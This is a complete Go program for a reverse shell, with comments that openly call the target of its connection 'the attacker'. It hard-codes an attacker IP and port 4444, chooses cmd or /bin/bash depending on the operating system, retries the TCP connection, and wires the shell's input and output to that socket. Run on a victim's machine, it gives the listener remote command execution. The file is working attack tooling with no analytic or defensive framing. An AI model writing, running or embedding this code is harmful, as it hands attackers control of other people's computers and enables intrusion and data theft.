package main

// Inspired by: https://psyrun.github.io/go-revshell/

import (
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"os/exec"
	"time"
)

var (
	IP          = "192.168.43.42" // Attacker's IP address
	PORT        = 4444            // Port the attacker is listening on
	MAX_RETRIES = 5               // Maximum number of connection attempts
	CMD string
)

// paramsCheck verifies if IP and PORT parameters are valid.
func paramsCheck() {
	if IP == "0.0.0.0" || PORT == 0 {
		log.Println("[ERROR] IP and/or PORT not defined.")
		os.Exit(1)
	}
	log.Println("[INFO] Parameters are valid.")

	switch current_os := runtime.GOOS; current_os {
		case "windows":
			log.Println("Running on Windows")
			CMD = "cmd"
		case "linux":
			log.Println("Running on Linux")
			CMD = "/bin/bash"
		default:
			log.Printf("Unknown OS: %s\n", current_os)
			os.Exit(1)
		}
}

// connToAttacker attempts to establish a TCP connection with the attacker, with retry logic.
func connToAttacker() net.Conn {
	var conn net.Conn
	var err error
	tries := 0

	for tries < MAX_RETRIES {
		conn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", IP, PORT))
		if err == nil {
			log.Println("[INFO] Connection established successfully.")
			return conn
		}

		log.Printf("[ERROR] Connection failed: %s. Retrying in 5 seconds...\n", err)
		tries++
		time.Sleep(5 * time.Second)
	}

	// If max retries are reached, exit the program.
	log.Println("[ERROR] Maximum number of retries reached. Exiting.")
	os.Exit(1)
	return nil
}

// shellExec launches an interactive shell and binds its stdin/stdout/stderr to the provided connection.
func shellExec(conn net.Conn) {
	defer conn.Close() // Ensure the connection is closed in case of an error

	cmd := exec.Command(CMD)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		log.Printf("[ERROR] Failed to start shell: %s\n", err)
		os.Exit(1)
	}

	// Wait for the shell command to finish.
	if err := cmd.Wait(); err != nil {
		log.Printf("[ERROR] Shell encountered an error: %s\n", err)
		os.Exit(1)
	}
}

func main() {
	log.Println("GO-REVERSE-SHELL")

	// Check parameters
	paramsCheck()

	// Try to connect to the attacker
	log.Println("[INFO] Attempting to connect to the attacker...")
	conn := connToAttacker()
	defer conn.Close() // Always close the connection at the end

	// Execute the shell
	shellExec(conn)
}
